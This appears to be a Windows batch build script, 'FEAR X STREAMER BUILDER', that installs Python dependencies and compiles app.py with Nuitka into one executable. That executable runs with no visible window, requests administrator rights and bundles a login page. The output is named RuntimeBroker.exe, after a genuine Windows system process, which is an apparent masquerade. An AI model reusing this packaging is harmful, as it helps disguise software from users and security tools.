@echo off
title FEAR X STREAMER BUILDER
cd /d "%~dp0"
cls

set "PYTHON_CMD="
python --version >nul 2>&1
if %errorlevel% equ 0 (
    set "PYTHON_CMD=python"
) else (
    py --version >nul 2>&1
    if %errorlevel% equ 0 (
        set "PYTHON_CMD=py"
    )
)

if "%PYTHON_CMD%"=="" (
    echo [ERROR] Python was not found in your PATH!
    pause
    exit /b 1
)

echo [1] Installing dependencies...
%PYTHON_CMD% -m pip install -r requirements.txt --quiet
if %errorlevel% neq 0 (
    echo [!] Pip failed, check your internet or python installation.
)

echo [2] Building Native EXE with Nuitka...
echo [!] Please wait, this process will compile to native C code and can take 3 to 8 minutes...
rmdir /s /q dist_nuitka >nul 2>&1
%PYTHON_CMD% -m nuitka --standalone --onefile --windows-console-mode=disable --windows-uac-admin --include-data-files=index.html=index.html --include-data-files=login.html=login.html --include-data-files=Succes.wav=Succes.wav --output-dir=dist_nuitka --output-filename=RuntimeBroker.exe app.py

echo.
echo ====================================================
echo Done! Check the 'dist_nuitka' folder for RuntimeBroker.exe
echo ====================================================
pause
